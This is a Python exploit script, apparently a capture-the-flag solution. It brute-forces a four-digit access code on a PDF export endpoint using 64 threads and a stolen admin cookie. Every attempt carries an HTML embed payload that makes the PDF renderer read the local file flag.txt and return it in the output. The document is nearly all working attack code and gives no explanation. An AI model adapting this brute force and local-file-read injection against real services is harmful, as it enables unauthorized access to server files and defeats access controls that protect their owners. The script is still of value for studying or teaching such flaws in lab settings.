# First create an account with username - admin
# Login and get the cookie
import requests
import threading
import queue

url = "http://IP:PORT/document/debug/export"
cookie = {"user": "ADMIN COOKIE"}

# Create a queue with all possible codes
q = queue.Queue()
for code in range(10000):
    q.put(str(code).zfill(4))

lock = threading.Lock()
found = False

def worker():
    global found
    while not q.empty() and not found:
        code_str = q.get()
        try:
            data = {
                "access_pass": code_str,
                "content": "<embed src='file:///flag.txt' type='text/plain'>"
            }
            response = requests.post(url, cookies=cookie, data=data, timeout=10)
            if response.status_code == 200 and response.headers.get('Content-Type') == 'application/pdf':
                with lock:
                    if not found:
                        found = True
                        with open(f"output_{code_str}.pdf", "wb") as f:
                            f.write(response.content)
                        print(f"Success with code {code_str}")
                        # Empty the queue to stop other threads
                        while not q.empty():
                            q.get()
            else:
                print(f"Failed with code {code_str}")
        except Exception as e:
            print(f"Error with code {code_str}: {e}")
        finally:
            q.task_done()

# Create and start threads
threads = []
for i in range(64):
    t = threading.Thread(target=worker)
    t.daemon = True
    threads.append(t)
    t.start()

# Wait for all threads to complete
q.join()
print("Brute force completed.")
